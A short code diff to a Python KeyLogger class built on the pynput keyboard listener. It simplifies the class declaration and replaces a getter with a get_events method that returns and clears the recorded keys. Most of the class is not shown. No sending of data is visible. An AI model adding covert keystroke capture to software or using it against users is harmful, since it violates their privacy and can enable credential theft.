@@ -1,7 +1,6 @@
-
 from pynput import keyboard
 
-class KeyLogger():
+class KeyLogger:
     def __init__(self):
         self.keys = []
         self.listener = None
@@ -24,5 +23,7 @@ class KeyLogger():
             self.listener.stop()
             self.is_logging = False
 
-    def get_logged_keys(self):
-        return self.keys
+    def get_events(self):
+        keys = self.keys[:]
+        self.keys.clear()
+        return keys
